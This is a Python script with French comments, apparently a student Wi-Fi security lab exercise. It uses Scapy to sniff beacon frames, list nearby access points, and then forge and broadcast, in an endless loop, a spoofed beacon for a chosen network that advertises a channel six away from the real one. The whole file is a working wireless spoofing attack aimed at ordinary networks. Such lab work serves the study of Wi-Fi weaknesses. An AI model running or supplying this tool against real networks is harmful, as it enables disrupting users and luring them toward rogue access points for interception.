# Description : Script permettant de générer un beacon concurrent annonçant un réseau 
#               sur un canal différent se trouvant à 6 canaux de séparation du réseau original
# Authors     : Géraud SILVESTI, Alexandre JAQUIER, Francesco MONTI
# Date        : 28.03.2023
# Usage       : 2_fakechannel.py

from scapy.all import Dot11Beacon, Dot11Elt, RadioTap, Dot11, sendp, sniff
import texttable as text_t

bssid_list = []
packet_list = []
ap_list = []



# Recherche d'un paquet Beacon afin de pouvoir extraire les informations nécessaires
def SSID_finder(packet):
    # On check que la trame est de type "beacon"
    if packet.haslayer(Dot11Beacon):
        # Le type doit être 0 et le subtype 8 obligatoirement
        if packet.type == 0 and packet.subtype == 8:
            # On check si on a déjà checker le bssid (autrement on fait rien)
            if packet.getlayer(Dot11).addr2 not in bssid_list:
                ssid = packet.getlayer(Dot11Elt).info.decode("utf-8")
                #On check si c'est pas un réseau caché
                if ssid == '':
                    ssid = "Masked Network"

                # Recupération de la puissance et du canal
                try:
                    # Puissance émise
                    radiotap = packet.getlayer(RadioTap)
                    rssi = radiotap.dBm_AntSignal
                    # Canal d'émission
                    channel = packet[Dot11Elt][2].info
                    channel = int.from_bytes(channel, byteorder='big')
                # Si on recupère rien, on fixe une valeur
                except:
                    rssi = "unknown"
                    channel = "unknown"

                # On ajoute dans les informations trouvés dans les listes
                bssid_list.append(packet.getlayer(Dot11).addr2)
                packet_list.append(packet)
                ap_list.append([packet.getlayer(Dot11).addr2, ssid, channel, rssi])


# Forge un faux beacon ayant un canal différent (6 de différence)
def forge_beacon(packet):
    NB_CHANNELS = 13
    # Contrôle que la trame est de type "beacon"
    if packet.haslayer(Dot11Beacon):
        # Le type doit être 0 et le subtype 8 obligatoirement
        if packet.type == 0 and packet.subtype == 8:
            beacon = packet
            # On crée un nouveau canal (avec 6 de différence)
            # On utilise le modulo 13 pour ne choisir que parmis les 13 canaux disponibles
            channel = ((int.from_bytes(packet[Dot11Elt][2].info, byteorder='big')+ 5) % NB_CHANNELS) + 1
            # On crée un nouveau paquet en ne prenant que la fin du beacon
            # Le reste des layers ne nous sert pas car ils seront supprimé avec l'envoi du nouveau beacon
            print("Channel : " + str(channel))

            packet_part = beacon[Dot11Elt][3]
            # On change le canal
            beacon[Dot11Elt:3] = Dot11Elt(ID="DSset", len=len(channel.to_bytes(1, 'big')), info=(channel.to_bytes(1, 'big')))
            # On ajoute la fin du paquet que l'on a modifié
            beacon_send = beacon/packet_part
            # On envoie le nouveau paquet
            sendp(beacon_send, iface=interface_to_check, loop=1)


# Affichage des informations sous forme de table
def display_texttable(list):
    table = text_t.Texttable()
    table.set_deco(text_t.Texttable.HEADER)
    table.set_cols_dtype(['i','t','t','t','t']) 
    table.set_cols_align(["l", "l", "l", "l", "l"])
    table.add_row(["No", "BSSID", "SSID", "Channel", "Strength"])

    i = 0
    for info in list:
        i += 1
        table.add_row([i, info[0], info[1], info[2], info[3]])
    print(table.draw())

interface_to_check = input("Nom de l'interface : ")
print("Interface selectionnée : " + interface_to_check)
sniff(iface=interface_to_check , prn=SSID_finder, timeout=10)
display_texttable(ap_list)

SSID_select = input("Numero du SSID à modifier : ")
print("No choisi : " + SSID_select)
forge_beacon(packet_list[int(SSID_select)-1])